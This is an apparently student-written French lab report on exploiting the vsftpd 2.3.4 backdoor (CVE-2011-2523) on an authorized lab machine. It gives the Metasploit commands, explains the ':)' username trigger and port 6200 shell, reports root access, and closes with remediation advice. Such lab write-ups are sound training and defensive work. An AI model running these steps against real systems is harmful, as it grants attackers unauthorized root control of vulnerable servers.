# Fiche Vulnérabilité N°01 — FTP (vsftpd 2.3.4)

## 1. Contexte et Identification

| **Champ** | **Valeur** |
|---|---|
| **Service cible** | FTP (vsftpd) |
| **Port d'écoute** | `21/tcp` |
| **Version détectée** | `vsftpd 2.3.4` |
| **Référence CVE** | `CVE-2011-2523` |
| **Score CVSS v3** | `9.8 (Critique)` |
| **Vecteur CVSS** | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Cible autorisée** | ESGIS VulnBox (`10.1.0.1`) |

---

## 2. Démarche Méthodologique & Observations

### A. Détection initiale (Nmap)

Le scan de détection des services et de leurs versions (`reports/nmap-services.txt`) a mis en évidence le service suivant sur le port standard :

```text
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
```

### B. Recherche du module sous Metasploit

La recherche du module correspondant a été effectuée directement dans `msfconsole` :

```text
msf > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

### C. Analyse technique du module (`info`)

La consultation des informations du module `exploit/unix/ftp/vsftpd_234_backdoor` permet de comprendre l'origine de la vulnérabilité :

- **Historique :** Entre le 30 juin et le 3 juillet 2011, l'archive officielle `vsftpd-2.3.4.tar.gz` hébergée sur le serveur maître a été compromise par l'ajout d'une porte dérobée (*backdoor*).
- **Fonctionnement :** La version compromise contient un mécanisme malveillant qui se déclenche lorsqu'un identifiant FTP se termine par le motif `:)`. Ce mécanisme peut provoquer l'ouverture d'un accès shell sur le port TCP `6200`.

### D. Chargement, configuration et exécution

Le module Metasploit identifié a été sélectionné et configuré pour l'environnement de laboratoire autorisé.

```text
msf > use 0
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.1.0.1
msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 10.1.0.6
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
```

---

## 3. Preuves Réelles

### 3.1 Configuration des options dans Metasploit

![- **Capture d'écran :**](../../screenshots/04-vulnerabilites/01-vsftpd-options.png)

### 3.2 Preuve technique — Session interactive (PoC)

![- **Capture d'écran :**](../../screenshots/05-resultats/01-vsftpd-session-root.png)

### 3.3 Résultat technique observé

Les observations réalisées dans l'environnement de laboratoire sont les suivantes :

- Déclenchement réussi de la porte dérobée sur la cible autorisée `10.1.0.1`.
- Obtention d'une session interactive avec les privilèges maximaux du système (`uid=0(root)`).
- Informations système et identité du compte vérifiées à l'aide des éléments de preuve `sysinfo` et `id`.

---

## 4. Mesures Correctives et Remédiation

- **Mise à jour logicielle prioritaire :** Remplacer immédiatement `vsftpd 2.3.4` par une version saine, maintenue et provenant d'une source officielle vérifiée.

- **Contrôle d'intégrité de la chaîne d'approvisionnement (Supply Chain) :** Vérifier systématiquement les condensats cryptographiques (SHA-256) et les signatures numériques (GPG) des paquets avant leur déploiement en production.

- **Principe du moindre privilège :** Désactiver le service FTP lorsqu'il n'est pas indispensable. Privilégier des protocoles chiffrés et authentifiés, tels que SFTP via OpenSSH.

- **Filtrage défensif (Pare-feu & IDS) :**
  - Restreindre l'accès au port `21/tcp` aux seuls réseaux d'administration autorisés.
  - Examiner et filtrer les communications inhabituelles associées au port TCP `6200`.
  - Configurer une détection réseau avec Snort ou Suricata pour identifier les comportements caractéristiques de la porte dérobée dans les échanges FTP.

---

## 5. Conclusion

Le test réalisé sur l'environnement autorisé ESGIS VulnBox a permis de confirmer la présence de la porte dérobée associée à `vsftpd 2.3.4` et d'obtenir une session interactive avec les privilèges `root`.

Cette vulnérabilité représente un risque majeur pour la confidentialité, l'intégrité et la disponibilité du système. Elle souligne également l'importance de vérifier l'intégrité des logiciels avant leur installation.

**Statut :** Validé — Test réalisé, preuve de session interactive obtenue et documentation établie.
